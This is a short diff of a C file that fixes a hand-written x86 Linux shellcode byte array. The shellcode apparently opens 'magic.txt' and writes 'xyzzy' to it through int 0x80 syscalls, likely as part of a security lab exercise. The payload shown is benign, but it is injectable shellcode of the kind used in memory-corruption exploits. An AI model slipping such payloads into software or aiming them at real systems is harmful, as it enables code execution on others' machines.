@@ -25,7 +25,7 @@ unsigned char payload[] =
 	/* ------------------------------------	*/
 	/* FIXME */
 	/* ------------------------------------	*/
-   "\x6a\x74"	    // push magic.txt
+   "\x6a\x74"	    			// push magic.txt
    "\x68\x78\x74\x2E\x63"
    "\x68\x69\x67\x61\x6D"
    "\x89\xe3"               	//mov    %esp,%ebx
@@ -37,9 +37,9 @@ unsigned char payload[] =
    "\xcd\x80"                	//int    $0x80
 
 
-   "\x89\xc3"               	//mov    %eax,%ebx
-   "\x68" "\x79\x7a\x7a\x79"	// push "xyzzy"
-   "\x6a\x78"
+   "\x89\xc3"					//mov    %eax,%ebx
+   "\x6a\x79"               	
+   "\x68" "\x7a\x7a\x79\x78"	// push "xyzzy"
    "\x89\xe1"              		//mov    %esp,%ecx
    "\x6a\x05"               	//push   $0x5
    "\x5a"                   	//pop    %edx
